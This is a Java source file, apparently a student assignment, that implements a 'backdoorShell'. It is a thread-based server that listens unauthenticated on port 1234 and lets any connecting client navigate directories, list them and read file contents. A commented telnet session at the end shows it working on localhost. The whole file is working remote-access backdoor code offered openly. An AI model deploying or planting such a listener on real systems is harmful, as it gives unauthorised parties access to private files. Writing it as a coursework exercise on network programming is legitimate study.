package ASSIN7;

import java.net.*;
import java.io.*;

public class backdoorShell extends Thread {
    private final Socket clientSocket;
    private String currentDirectory;

    public backdoorShell(Socket clientSocket) throws IOException {
        this.clientSocket = clientSocket;
        currentDirectory = System.getProperty("user.dir");
    }

    private String getCurrentDirectoryPrompt(String currentDirectory) {
        String prompt;
        if (System.getProperty("os.name").startsWith("Windows")) {
            prompt = currentDirectory + "> ";
        } else {
            prompt = currentDirectory + " % ";
        }
        return prompt;
    }


    public void run()
    {
        try {
            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
            {
                String commandPrompt = getCurrentDirectoryPrompt(currentDirectory);
                out.print(commandPrompt);
                out.flush();

                String line;
                while ((line = in.readLine()) != null) {
                    String[] tokens = line.split("\\s+");
                    switch (tokens[0]) {

                        case "cd":
                            if (tokens.length == 1) {
                                out.println(currentDirectory);
                                out.print(currentDirectory + "> ");
                                out.flush();
                                break;
                            }

                            String path = tokens[1];
                            if (path.equals(".")) {
                                // stay in the same directory
                            } else if (path.equals("~")) {
                                currentDirectory = System.getProperty("user.dir");
                            } else if (path.equals("..")) {
                                String parent = new File(currentDirectory).getParent();
                                if (parent != null) {
                                    currentDirectory = parent;
                                }
                            } else {
                                File file = new File(currentDirectory, path);
                                if (file.exists() && file.isDirectory()) {
                                    currentDirectory = file.getAbsolutePath();
                                } else {
                                    out.println("Directory not found: " + path);
                                }
                            }
                            commandPrompt = getCurrentDirectoryPrompt(currentDirectory);
                            out.print(commandPrompt);
                            out.flush();
                            break;


                        case "dir":
                            File directory = new File(currentDirectory);
                            if (directory.exists() && directory.isDirectory()) {
                                File[] files = directory.listFiles();
                                out.println("List of files in " + currentDirectory);
                                for (File file : files) {
                                    if (file.isDirectory()) {
                                        out.println(file.getName() + " - Directory");
                                    } else {
                                        out.println(file.getName() + " - File");
                                    }
                                }
                                out.println(files.length + " files in total");
                            } else {
                                out.println("Directory not found: " + currentDirectory);
                            }
                            out.print(getCurrentDirectoryPrompt(currentDirectory));
                            out.flush();
                            break;

                        case "cat":
                            String fileName = tokens[1];
                            File file = new File(currentDirectory, fileName);
                            if (!file.exists()) {
                                out.println("File " + fileName + " not found!");
                                break;
                            }
                            if (!file.isFile()) {
                                out.println(fileName + " is not a file!");
                                break;
                            }
                            try (BufferedReader br = new BufferedReader(new FileReader(file))) {
                                String fileContent = "";
                                String lineContent;
                                while ((lineContent = br.readLine()) != null) {
                                    fileContent += lineContent + "\n";
                                }
                                out.println(fileContent);
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                            out.print(commandPrompt);
                            out.flush();
                            break;
                        default:
                            out.println("Unknown command: " + tokens[0]);
                            out.print(commandPrompt);
                            out.flush();
                            break;
                    }
                }
            }
        } catch (IOException e) {
            System.out.println("Error: " + e.getMessage());
        }
    }
    public static void main(String[] args) {
        try {
            ServerSocket serverSocket = new ServerSocket(1234);
            System.out.println("Listening on port " + 1234);
            Socket clientSocket = serverSocket.accept();
            Thread t1 = new backdoorShell(clientSocket);
            t1.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
//Output test:
/*
yuanyuandong@Sources-MacBook-Air ~ % telnet localhost 1234
        Trying ::1...
        Connected to localhost.
        Escape character is '^]'.
        /Users/yuanyuandong/Documents/repos/csc123/src % cd
        /Users/yuanyuandong/Documents/repos/csc123/src

        /Users/yuanyuandong/Documents/repos/csc123/src> dir
        List of files in /Users/yuanyuandong/Documents/repos/csc123/src
        .DS_Store - File
        ASSINMENT8b - Directory
        ASSINMENTused - Directory
        ASSINMENT7 - Directory
        Circle.java - File
        test.java - File
        ASSIN7 - Directory
        UserManager.java - File
        8 files in total

        /Users/yuanyuandong/Documents/repos/csc123/src % cat test
        File test not found!
        
        cat test.java
public class test {
    public static void main(String[] args) {
        for (int x = 0; x < 9; x++) {
            System.out.println(x / (x % 2));
        }
    }
}

*/

